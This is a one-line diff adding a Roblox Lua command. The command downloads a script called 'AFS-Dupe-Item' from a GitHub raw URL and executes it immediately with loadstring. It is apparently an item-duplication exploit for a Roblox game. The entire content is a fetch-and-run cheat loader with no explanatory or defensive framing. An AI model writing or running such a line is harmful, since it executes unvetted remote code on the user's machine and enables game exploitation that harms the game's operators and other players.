@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/AnSitDz/AnSitHub/main/AFS-Dupe-Item"),true))()
